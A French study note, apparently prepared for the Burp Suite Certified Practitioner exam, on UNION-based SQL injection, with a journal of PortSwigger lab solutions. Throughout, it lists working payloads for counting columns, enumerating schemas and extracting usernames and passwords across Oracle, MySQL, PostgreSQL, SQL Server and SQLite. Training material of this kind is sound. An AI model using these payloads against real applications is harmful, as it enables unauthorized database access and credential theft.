---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: à faire
---
# SQL-injection-Union-Attacks

## En bref
- L'UNION attack (UNION-based SQLi) s'applique quand l'application est vulnérable à la SQL injection (SQLi) et que les résultats de la requête sont renvoyés dans ses réponses.
- Le mot-clé `UNION` permet d'extraire des données d'autres tables de la base.
- Il permet d'exécuter une ou plusieurs requêtes `SELECT` supplémentaires et d'ajouter leurs résultats à ceux de la requête d'origine.
- Exemple : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`.
- Cette requête renvoie un seul jeu de résultats à deux colonnes, contenant les valeurs de `a` et `b` (table1) et celles de `c` et `d` (table2).
- La requête d'origine peut renvoyer une ou plusieurs lignes. `UNION` s'évalue après le `WHERE` d'origine : les lignes injectées s'ajoutent à son résultat.
- Les types doivent être compatibles colonne par colonne. Certains moteurs convertissent implicitement (MySQL est plutôt permissif), d'autres sont stricts (Oracle). `NULL` s'adapte à tous les types.

## Types et variantes
- `UNION` supprime les doublons du jeu de résultats, `UNION ALL` les conserve. Les deux fonctionnent pour l'attaque, avec les mêmes contraintes (même nombre de colonnes, types compatibles).
- Le point d'injection peut être une chaîne entre guillemets (il faut alors fermer le guillemet avec `'`) ou une valeur numérique (pas de guillemet à fermer). Sauf mention contraire, les payloads de cette note supposent une chaîne entre guillemets dans la clause `WHERE`. Exemple en contexte numérique : `1 UNION SELECT NULL,NULL--`.
- La syntaxe varie selon la base de données (voir plus bas) : Oracle, MySQL, Microsoft SQL Server, PostgreSQL, SQLite.

## Comment détecter
- Les tests de détection (apostrophe, boolean-based, time-based) sont décrits dans [[SQL-injection]].
- La seule question propre à cette note : le résultat de la requête est-il affiché dans la réponse ? Si oui, l'UNION attack convient, en suivant l'ordre : nombre de colonnes, colonnes de texte, extraction.
- Si le résultat n'est pas affiché, ou si le mot `UNION` est filtré, passer à l'Error-based SQLi ([[Error-based SQL Injection]]) ou à la Blind SQLi ([[Blind-SQL-injection]]).

## Comment exploiter (principe)
- L'UNION attack exige deux conditions :
	- Les requêtes individuelles doivent renvoyer le même nombre de colonnes.
	- Les types de données de chaque colonne doivent être compatibles entre les différentes requêtes.
- Il faut donc déterminer :
	- Le nombre de colonnes renvoyées par la requête d'origine.
	- Quelles colonnes renvoyées par la requête d'origine ont un type de données adapté pour contenir les résultats de la requête injectée.

### Détermination du nombre de colonnes requises (méthode `ORDER BY`)
- Lors d'une UNION attack, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d'origine. La première utilise `ORDER BY`.
- Principe : injecter une série de clauses `ORDER BY` en incrémentant l'index de colonne jusqu'à ce qu'une erreur se produise.

**Payloads**
- Si le point d'injection est une chaîne entre guillemets dans la clause `WHERE`, on envoie donc :
	- `' ORDER BY 1--`
	- `' ORDER BY 2--`
	- `' ORDER BY 3--`
	- et ainsi de suite
- Chaque payload trie les résultats selon une colonne différente du jeu de résultats.
- La colonne peut être désignée par son index : il n'est pas nécessaire de connaître les noms des colonnes.
- Quand l'index dépasse le nombre réel de colonnes, la base renvoie une erreur (exemple sur Microsoft SQL Server : la position de la clause `ORDER BY` est hors de la plage du nombre d'éléments de la liste de sélection).

#### Lecture de la réponse
- L'application peut renvoyer l'erreur de la base dans la réponse HTTP, une erreur générique, ou simplement aucun résultat.
- Tant qu'une différence dans la réponse est détectable, on peut en déduire le nombre de colonnes (la dernière valeur d'index qui n'a pas provoqué d'erreur).

### Détermination du nombre de colonnes requises (méthode `UNION SELECT NULL`)
- Seconde méthode : envoyer une série de payloads `UNION SELECT` avec un nombre croissant de valeurs `NULL`.
- Payloads :
	- `' UNION SELECT NULL--`
	- `' UNION SELECT NULL,NULL--`
	- `' UNION SELECT NULL,NULL,NULL--`
	- et ainsi de suite
- Lecture des erreurs
	- Si le nombre de `NULL` ne correspond pas au nombre de colonnes, la base renvoie une erreur (exemple sur Microsoft SQL Server : toutes les requêtes combinées par `UNION`, `INTERSECT` ou `EXCEPT` doivent avoir le même nombre d'expressions dans leur liste cible).
	- Comme pour `ORDER BY`, l'application peut renvoyer l'erreur de la base, une erreur générique, ou simplement aucun résultat.
- Pourquoi utiliser `NULL` ?
	- `NULL` est convertible vers tous les types de données courants, ce qui maximise les chances de réussite quand le nombre de colonnes est correct.
- Quand le nombre de `NULL` est correct
	- La base renvoie une ligne supplémentaire dans le jeu de résultats, avec des valeurs nulles dans chaque colonne.
	- L'effet sur la réponse HTTP dépend du code de l'application.
		- Cas favorable : du contenu supplémentaire apparaît, par exemple une ligne en plus dans un tableau HTML.
		- Autre cas : les valeurs nulles déclenchent une autre erreur (par exemple, côté application, une `NullPointerException`).
		- Pire cas : la réponse ressemble à celle d'un mauvais nombre de `NULL`, ce qui rend la méthode inefficace.

### Syntaxe propre à chaque base de données
**Oracle**
- Toute requête `SELECT` doit utiliser le mot-clé `FROM` et préciser une table valide.
- Oracle fournit une table intégrée, `DUAL`, utilisable à cet effet.
- Les requêtes injectées doivent donc ressembler à : `' UNION SELECT NULL FROM DUAL--`

**MySQL**
- Le commentaire `--` exige un espace final, ou `#` : voir les pièges communs dans [[SQL-injection]].

### Trouver les colonnes avec un type de données utile
- Une UNION attack permet de récupérer les résultats d'une requête injectée.
- Les données intéressantes sont normalement sous forme de chaîne : il faut donc trouver une ou plusieurs colonnes dont le type est, ou est compatible avec, des données de type chaîne.

**Méthode**
- Une fois le nombre de colonnes déterminé, on teste chaque colonne pour savoir si elle accepte une chaîne.
- On envoie une série de payloads `UNION SELECT` qui placent une chaîne dans chaque colonne tour à tour.
- Exemple avec quatre colonnes :
	- `' UNION SELECT 'a',NULL,NULL,NULL--`
	- `' UNION SELECT NULL,'a',NULL,NULL--`
	- `' UNION SELECT NULL,NULL,'a',NULL--`
	- `' UNION SELECT NULL,NULL,NULL,'a'--`

**Lecture du résultat**
- Colonne incompatible avec une chaîne : la requête injectée provoque une erreur de base de données (exemple sur Microsoft SQL Server : échec de conversion de la valeur varchar 'a' vers le type de données int).
- Aucune erreur et réponse contenant du contenu supplémentaire avec la chaîne injectée : la colonne convient pour récupérer des données de type chaîne.
- Dans un lab, le sujet fournit une valeur aléatoire à faire apparaître dans la réponse : on la place à la place de `'a'`.

### Récupérer des données intéressantes avec une UNION attack
- Une fois le nombre de colonnes déterminé et les colonnes de type chaîne identifiées, on peut récupérer des données intéressantes.
- Exemple :
	- La requête d'origine renvoie deux colonnes, toutes deux compatibles avec des chaînes.
	- Le point d'injection est une chaîne entre guillemets dans la clause `WHERE`.
	- La base contient une table `users` avec les colonnes `username` et `password`.

**Payload**
- Le contenu de la table `users` s'obtient avec : `' UNION SELECT username, password FROM users--`

**Prérequis**
- Il faut connaître le nom de la table (`users`) et de ses colonnes (`username`, `password`).
- Sans cette information, il faut deviner les noms des tables et des colonnes.
- Toutes les bases modernes offrent des moyens d'examiner leur structure (voir la section sur le contenu de la base de données plus bas).

### Récupérer plusieurs valeurs dans une seule colonne
- Dans certains cas, la requête d'origine ne renvoie qu'une seule colonne de type chaîne (ou une seule parmi plusieurs).
- On peut alors récupérer plusieurs valeurs ensemble dans cette colonne en les concaténant.
- On peut inclure un séparateur pour distinguer les valeurs combinées.

**Exemple sur Oracle**
- Payload : `' UNION SELECT username || '~' || password FROM users--`
- `||` (double barre verticale) est l'opérateur de concaténation de chaînes sur Oracle.
- La requête injectée concatène `username` et `password`, séparés par le caractère `~`.

**Résultat obtenu**
- La réponse contient tous les identifiants sous la forme `utilisateur~mot_de_passe`, par exemple :
	- `administrator~s3cure`
	- `wiener~peter`
	- `carlos~montoya`

**Point clé**
- Chaque base de données utilise une syntaxe différente pour la concaténation (tableau maître plus bas, d'après la cheat sheet PortSwigger).
- Si la requête d'origine a deux colonnes dont une seule accepte du texte, on place `NULL` dans l'autre : `' UNION SELECT NULL,username||'~'||password FROM users--` (syntaxe Oracle et PostgreSQL).
- Pour récupérer toutes les lignes d'une table dans une seule valeur, on peut aussi agréger (voir la section sur l'extraction de plusieurs lignes).

### Analyse de la base de données
- Il est souvent nécessaire de recueillir des informations sur la base de données. Cela peut comprendre :
	- Le type et la version de la base de données.
	- Les tables que contient la base et les colonnes de ces tables.

#### Interroger le type et la version de la base de données
- On peut identifier le type et la version de la base en injectant des requêtes propres à chaque fournisseur, puis en vérifiant laquelle fonctionne.

**Requêtes selon la base**

| Type de base de données | Requête                                                       |
| ----------------------- | ------------------------------------------------------------- |
| Microsoft, MySQL        | `SELECT @@version`                                            |
| Oracle                  | `SELECT * FROM v$version` (ou `SELECT banner FROM v$version`) |
| PostgreSQL              | `SELECT version()`                                            |

**Exemple**
- Payload UNION : `' UNION SELECT @@version--`
- Le résultat peut afficher la version complète, par exemple : `Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)`.
- Dans ce cas, on confirme que la base est Microsoft SQL Server et on connaît sa version.

**Rappel pratique**
- Cette requête doit respecter les contraintes vues plus haut : bon nombre de colonnes et colonne compatible avec une chaîne (par exemple `' UNION SELECT @@version,NULL--` si la requête d'origine a deux colonnes).
- Sur MySQL, terminer par `#` ou par `-- ` (avec l'espace), par exemple `' UNION SELECT @@version,NULL#`.
- Sur Oracle, il faut ajouter `FROM DUAL` quand la requête ne cible pas de table, mais `v$version` est déjà une table. On cible la colonne `banner` : `' UNION SELECT banner,NULL FROM v$version--`

### Afficher le contenu de la base de données
- La plupart des types de bases de données, sauf Oracle, disposent d'un ensemble de vues appelé schéma d'information (`information_schema`), qui fournit des informations sur la base.
- Oracle utilise à la place les vues `all_tables` et `all_tab_columns`.

#### Lister les tables
- Requête : `SELECT * FROM information_schema.tables`
- Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `TABLE_TYPE`.
- Dans l'exemple de PortSwigger, la sortie révèle trois tables : `Products`, `Users` et `Feedback`.
- Oracle : `SELECT * FROM all_tables` (colonnes utiles : `OWNER`, `TABLE_NAME`).

#### Lister les colonnes d'une table
- Requête : `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
- Colonnes renvoyées : `TABLE_CATALOG`, `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`.
- Dans l'exemple, la table `Users` contient `UserId` (int), `Username` (varchar) et `Password` (varchar).
- Oracle : `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` (colonnes utiles : `OWNER`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`). Oracle stocke les noms non protégés par des guillemets en majuscules : il faut écrire `'USERS'`.

#### Lien avec l'UNION attack
- On a besoin des noms de tables et de colonnes avant de lancer `' UNION SELECT username, password FROM users--`.
- En pratique, via une UNION attack, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes :
	- Tables, base non Oracle : `' UNION SELECT table_name,NULL FROM information_schema.tables--`
	- Colonnes, base non Oracle : `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`
	- Tables, Oracle : `' UNION SELECT table_name,NULL FROM all_tables--`
	- Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--`
	- Données : `' UNION SELECT username, password FROM users--`
- Les noms de table et de colonnes peuvent être aléatoires (par exemple `users_abcdef`) : il faut alors passer par cette énumération.
- Variantes par moteur :
	- PostgreSQL : filtrer sur le schéma applicatif pour éviter le bruit des tables système : `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`. Les tables d'un autre schéma n'apparaissent pas.
	- SQLite : pas de `information_schema`. `' UNION SELECT sqlite_version(),NULL--`, puis `' UNION SELECT name,sql FROM sqlite_master--` pour les noms de tables et leurs définitions.
	- Oracle : `' UNION SELECT table_name,NULL FROM user_tables--` ne liste que les tables du schéma courant ; `user_tab_columns` donne les colonnes correspondantes.

### Extraire plusieurs lignes
Quand la page n'affiche qu'une seule valeur, on agrège toutes les lignes dans une cellule ou on les parcourt une par une. Les exemples supposent une colonne de texte disponible.

| Besoin | Moteur | Payload | Limites |
|---|---|---|---|
| Agréger | MySQL | `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password) FROM users-- ` | Limite `group_concat_max_len` |
| Agréger | PostgreSQL | `' UNION SELECT NULL,STRING_AGG(username\|\|':'\|\|password,',') FROM users--` | Longueur d'affichage |
| Agréger | SQL Server | `' UNION SELECT NULL,STRING_AGG(username+':'+password,',') FROM users--` | SQL Server 2017 et suivants ; `+` à encoder en `%2b` ; sur les versions plus anciennes, `FOR XML PATH('')` |
| Agréger | Oracle | `' UNION SELECT NULL,LISTAGG(username\|\|':'\|\|password,',') WITHIN GROUP (ORDER BY username) FROM users--` | Longueur maximale d'une chaîne SQL (4000 octets par défaut) |
| Parcourir | PostgreSQL, MySQL | `' UNION SELECT username,password FROM users LIMIT 1 OFFSET 1-- ` | Dépend d'une page qui affiche la première ligne injectée |
| Parcourir | SQL Server | `' UNION SELECT username,password FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Un `ORDER BY` est requis |
| Parcourir | Oracle | `' UNION SELECT username,password FROM users OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Oracle 12c et suivants ; sinon `ROWNUM` |
| Une seule ligne | SQL Server | `SELECT TOP 1 ...` | Équivalent de `LIMIT 1` |

`UNION ALL` (`' UNION ALL SELECT NULL,NULL--`) conserve la ligne injectée même si elle est identique à une ligne existante.

### Informations courantes par moteur
| Besoin | Oracle | MySQL | PostgreSQL | SQL Server | SQLite |
|---|---|---|---|---|---|
| Concaténation | `'a'\|\|'b'` | `CONCAT('a','b')` ou `'a' 'b'` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` |
| Commentaire | `--` | `-- ` ou `#` | `--` | `--` | `--` |
| Utilisateur et base courants | `user` (avec `FROM DUAL`) | `user()`, `database()` | `current_user`, `current_database()` | `SYSTEM_USER`, `DB_NAME()` | sans objet |
| Version | `banner` de `v$version` | `@@version` | `version()` | `@@version` | `sqlite_version()` |
| Liste des tables | `all_tables`, `user_tables` | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `sqlite_master` |

## Pièges et points d'attention BSCP
Les pièges communs (commentaire MySQL, encodage URL, cookie) sont dans [[SQL-injection]].
- Déterminer le nombre de colonnes avant tout, puis les colonnes de type chaîne : sauter ces étapes fait échouer la SQLi sans message clair.
- Oracle : `FROM DUAL` obligatoire pour les `SELECT` sans table, noms d'objets en majuscules dans `all_tables` et `all_tab_columns`.
- Encodage URL : `+` vaut espace, donc `%2b` pour l'opérateur de concaténation Microsoft.
- Une seule colonne de type chaîne : concaténer plusieurs valeurs avec un séparateur.
- La réponse peut ne pas afficher d'erreur : comparer longueur et contenu des réponses (Burp Repeater) plutôt que chercher un message. Un `ORDER BY` qui échoue peut aussi ne produire aucune erreur visible.
- La requête d'origine peut renvoyer plusieurs lignes : la ligne injectée apparaît en plus, parfois en bas de la liste. Utiliser une catégorie inexistante dans le filtre peut isoler le résultat injecté.
- Une colonne de texte n'est pas forcément affichée dans la page : tester chaque colonne et vérifier où apparaît la valeur.
- Un `LIMIT` dans la requête d'origine peut faire disparaître la ligne injectée.
- Le point d'injection n'est pas toujours dans l'URL (corps, cookie, header), mais la page doit réafficher la donnée : l'UNION attack n'aboutit que si un cookie ou un header injecté est répercuté dans la réponse.
- Limites : longueur de la valeur affichée, caractères échappés par l'application, filtrage du mot `UNION`, pare-feu applicatif.
- Hors périmètre ici : stacked queries, lecture de fichiers et second-order sont décrits dans [[SQL-injection]].

## Prévention
Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège, erreurs masquées). Point propre à cette attaque : retirer au compte de la base les droits sur `information_schema` et les vues de schéma, pour limiter l'énumération.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-26
- [x] Practitioner ✅ 2026-10-27
- [ ] Expert

## Journal des labs
### Lab: SQL injection UNION attack, determining the number of columns returned by the query
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables. La première étape d'une telle attaque consiste à déterminer le nombre de colonnes renvoyées par la requête. Vous utiliserez ensuite cette technique dans les laboratoires suivants pour mettre au point l'attaque complète.

Pour résoudre cet exercice, déterminez le nombre de colonnes renvoyées par la requête en effectuant une attaque par injection SQL de type UNION qui renvoie une ligne supplémentaire contenant des valeurs nulles.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Modifier le paramètre `category` en lui donnant la valeur `'+UNION+SELECT+NULL--`. Constater qu'une erreur se produit.
3. Modifier le paramètre `category` pour ajouter une colonne supplémentaire contenant une valeur nulle :

    `'+UNION+SELECT+NULL,NULL--`
4. Continuer à ajouter des valeurs nulles jusqu'à ce que l'erreur disparaisse et que la réponse contienne du contenu supplémentaire avec les valeurs nulles.

### Lab: SQL injection UNION attack, finding a column containing text
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables. Pour mettre en place une telle attaque, vous devez d'abord déterminer le nombre de colonnes renvoyées par la requête, à l'aide de la technique apprise lors du laboratoire précédent. L'étape suivante consiste à identifier une colonne compatible avec les données de type chaîne de caractères.

Le laboratoire vous fournira une valeur aléatoire que vous devrez faire apparaître dans les résultats de la requête. Pour résoudre cet exercice, effectuez une attaque par injection SQL de type UNION qui renvoie une ligne supplémentaire contenant la valeur fournie. Cette technique permet de déterminer quelles colonnes acceptent les données de type chaîne de caractères.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Déterminer le nombre de colonnes renvoyées par la requête. Vérifier que la requête renvoie trois colonnes, en utilisant la charge utile suivante dans le paramètre `category` :

    `'+UNION+SELECT+NULL,NULL,NULL--`
3. Essayer de remplacer chaque valeur nulle par la valeur aléatoire fournie par le laboratoire, par exemple :

    `'+UNION+SELECT+NULL,'abcdef',NULL--`
4. Si une erreur se produit, passer à la valeur nulle suivante et essayer à cet emplacement.

### Lab: SQL injection UNION attack, retrieving data from other tables
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables. Pour mettre en place une telle attaque, vous devez combiner certaines des techniques apprises lors des laboratoires précédents.

La base de données contient une autre table nommée `users`, comportant des colonnes intitulées `username` et `password`.

Pour résoudre cet exercice, effectuez une attaque par injection SQL de type UNION permettant de récupérer tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Déterminer le nombre de colonnes renvoyées par la requête et celles qui contiennent du texte. Vérifier que la requête renvoie deux colonnes, toutes deux de type texte, en utilisant une charge utile comme la suivante dans le paramètre `category` :

    `'+UNION+SELECT+'abc','def'--`
3. Utiliser la charge utile suivante pour récupérer le contenu de la table `users` :

    `'+UNION+SELECT+username,+password+FROM+users--`
4. Vérifier que la réponse de l'application contient des noms d'utilisateur et des mots de passe.

### Lab: SQL injection UNION attack, retrieving multiple values in a single column
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables.

La base de données contient une autre table nommée `users`, comportant des colonnes intitulées `username` et `password`.

Pour résoudre cet exercice, effectuez une attaque par injection SQL de type UNION permettant de récupérer tous les noms d'utilisateur et mots de passe, puis utilisez ces informations pour vous connecter en tant qu'administrateur.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Déterminer le nombre de colonnes renvoyées par la requête et celles qui contiennent du texte. Vérifier que la requête renvoie deux colonnes, dont une seule de type texte, en utilisant une charge utile comme la suivante dans le paramètre `category` :

    `'+UNION+SELECT+NULL,'abc'--`
3. Utiliser la charge utile suivante pour récupérer le contenu de la table `users`, en concaténant le nom d'utilisateur et le mot de passe dans la colonne de type texte :

    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. Vérifier que la réponse de l'application contient des noms d'utilisateur et des mots de passe.

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête injectée sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour les récupérer.

Pour résoudre cet exercice, affichez la chaîne de version de la base de données.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Déterminer le nombre de colonnes renvoyées par la requête et celles qui contiennent du texte. Vérifier que la requête renvoie deux colonnes, toutes deux de type texte, en utilisant une charge utile comme la suivante dans le paramètre `category` :

    `'+UNION+SELECT+'abc','def'#`
3. Utiliser la charge utile suivante pour afficher la version de la base de données :

    `'+UNION+SELECT+@@version,+NULL#`

### Lab: SQL injection attack, listing the database contents on non-Oracle databases
Ce laboratoire présente une vulnérabilité de type injection SQL dans le filtre de catégorie de produits. Les résultats de la requête sont renvoyés dans la réponse de l'application ; vous pouvez donc utiliser une attaque de type UNION pour extraire des données d'autres tables.

L'application dispose d'une fonction de connexion, et la base de données contient une table qui stocke les noms d'utilisateur et les mots de passe. Vous devez déterminer le nom de cette table et les colonnes qu'elle contient, puis récupérer son contenu pour obtenir les noms d'utilisateur et les mots de passe de tous les utilisateurs.

Pour résoudre cet exercice, connectez-vous en tant qu'utilisateur `administrator`.

#### Solution
1. Utiliser Burp Suite pour intercepter et modifier la requête qui définit le filtre de catégorie de produits.
2. Déterminer le nombre de colonnes renvoyées par la requête et celles qui contiennent du texte. Vérifier que la requête renvoie deux colonnes, toutes deux de type texte, en utilisant une charge utile comme la suivante dans le paramètre `category` :

    `'+UNION+SELECT+'abc','def'--`
3. Utiliser la charge utile suivante pour récupérer la liste des tables de la base de données :

    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Repérer le nom de la table contenant les identifiants des utilisateurs.
5. Utiliser la charge utile suivante (en remplaçant le nom de la table) pour récupérer le détail des colonnes de cette table :

    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Repérer les noms des colonnes contenant les noms d'utilisateur et les mots de passe.
7. Utiliser la charge utile suivante (en remplaçant les noms de la table et des colonnes) pour récupérer les noms d'utilisateur et les mots de passe de tous les utilisateurs :

    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Repérer le mot de passe de l'utilisateur `administrator`, puis l'utiliser pour se connecter.


## Liens
- [[SQL-injection]]
- [[Blind-SQL-injection]]
- [[Error-based SQL Injection]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
